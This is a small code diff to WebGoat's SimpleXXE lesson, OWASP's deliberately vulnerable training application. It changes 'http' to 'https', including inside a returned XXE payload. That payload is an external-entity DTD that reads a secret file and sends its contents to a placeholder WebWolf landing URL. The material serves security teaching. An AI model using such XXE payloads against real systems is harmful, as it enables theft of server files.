@@ -1,5 +1,5 @@
 /*
- * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
+ * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see https://www.owasp.org/
  *
  * Copyright (c) 2002 - 2019 Bruce Mayhew
  *
@@ -105,7 +105,7 @@ public class SimpleXXE extends AssignmentEndpoint {
     return """
                 <?xml version="1.0" encoding="UTF-8"?>
                 <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
-                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
+                <!ENTITY % all "<!ENTITY send SYSTEM 'https://replace-this-by-webwolf-base-url/landing?text=%file;'>">
                 %all;
                 """;
   }
